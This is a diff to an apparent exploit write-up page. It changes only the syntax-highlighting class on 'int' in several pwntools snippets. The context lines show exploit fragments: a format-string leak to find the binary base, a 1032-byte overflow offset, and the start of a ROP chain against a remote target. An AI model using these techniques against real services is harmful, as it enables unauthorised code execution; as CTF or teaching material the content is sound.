@@ -389,7 +389,7 @@ shell</span><span class="o"> =</span><span class="p"> remote(</span><span class=
 shell.sendline(</span><span class="no">b</span><span class="s">"TEST %p.%p"</span><span class="p">)
 shell.recvuntil(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
 
-binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x14120</span><span class="p">  
+binary_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x14120</span><span class="p">  
 log.info(</span><span class="no">f</span><span class="s">"Binary base: </span><span class="p">{</span><span class="no">hex</span><span class="p">(binary_base)}</span><span class="s">"</span><span class="p">)
 
 shell.interactive()</span>
@@ -452,7 +452,7 @@ shell</span><span class="o"> =</span><span class="p"> remote(</span><span class=
 shell.sendline(</span><span class="no">b</span><span class="s">"TEST %p.%p"</span><span class="p">)
 shell.recvuntil(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
 
-binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(), </span><span class="mi">16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x14120</span><span class="p">  
+binary_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shell.recvline().strip(), </span><span class="mi">16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x14120</span><span class="p">  
 
 offset</span><span class="o"> =</span><span class="mi"> 1032</span><span class="p">
 junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
@@ -572,7 +572,7 @@ shell</span><span class="o"> =</span><span class="p"> remote(</span><span class=
 shell.sendline(</span><span class="no">b</span><span class="s">"TEST %p.%p"</span><span class="p">)
 shell.recvuntil(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
 
-binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(), </span><span class="mi">16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x14120</span><span class="p">  
+binary_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shell.recvline().strip(), </span><span class="mi">16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x14120</span><span class="p">  
 
 offset</span><span class="o"> =</span><span class="mi"> 1032</span><span class="p">
 junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
@@ -682,7 +682,7 @@ shell</span><span class="o"> =</span><span class="p"> remote(</span><span class=
 shell.sendline(</span><span class="no">b</span><span class="s">"TEST %p.%p"</span><span class="p">)
 shell.recvuntil(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
 
-binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(), </span><span class="mi">16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x14120</span><span class="p">  
+binary_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shell.recvline().strip(), </span><span class="mi">16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x14120</span><span class="p">  
 
 rop</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01010</span><span class="p">)</span><span class="o"> *</span><span class="mi"> 30</span><span class="c1"> # ret;</span><span class="p">
@@ -854,7 +854,7 @@ shell</span><span class="o"> =</span><span class="p"> remote(</span><span class=
 shell.sendline(</span><span class="no">b</span><span class="s">"TEST %p.%p"</span><span class="p">)
 shell.recvuntil(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
 
-binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(), </span><span class="mi">16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x14120</span><span class="p">
+binary_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shell.recvline().strip(), </span><span class="mi">16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x14120</span><span class="p">
 
 rop</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01010</span><span class="p">)</span><span class="o"> *</span><span class="mi"> 30</span><span class="c1"> # ret;
@@ -1031,7 +1031,7 @@ shell</span><span class="o"> =</span><span class="p"> remote(</span><span class=
 shell.sendline(</span><span class="no">b</span><span class="s">"TEST %p.%p"</span><span class="p">)
 shell.recvuntil(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
 
-binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(), </span><span class="mi">16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x14120</span><span class="p">
+binary_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shell.recvline().strip(), </span><span class="mi">16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x14120</span><span class="p">
 
 rop</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
 rop</span><span class="o"> +=</span><span class="p"> p32(binary_base</span><span class="o"> +</span><span class="mi"> 0x01010</span><span class="p">)</span><span class="o"> *</span><span class="mi"> 30</span><span class="c1"> # ret;</span><span class="p">
